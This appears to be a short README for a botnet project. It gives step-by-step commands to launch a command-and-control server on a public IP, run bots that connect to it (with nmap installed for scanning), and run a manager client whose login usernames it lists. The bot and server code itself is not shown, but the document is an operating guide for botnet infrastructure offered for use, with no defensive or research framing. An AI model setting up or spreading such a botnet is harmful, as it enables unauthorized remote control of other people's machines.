Botnet workflow
See diagram.png for more detail

Instruction
1. Run chanel with a public IP

	sudo apt-get install python3
	
	sudo apt-get install python3-pip
	
	python3 -m pip install colorama

	python3 c2server.py

2. Run bots, connect to c2server
	
	sudo apt-get install python3
	
	sudo apt-get install python3-pip
	
	sudo apt-get install nmap
	
	python3 -m pip install python3-nmap
	
	python3 -m pip install requests

	sudo python3 bot.py c2server_ip

3. Run manager, control
	
	sudo apt-get install python3
	
	sudo apt-get install python3-pip
	
	python3 -m pip install colorama

	python3 mngm.py c2server_ip

	Login with user:
		User: pmtoan
		Pass: /
	or user:
		User: long
		Pass: /

	Type help for more detail
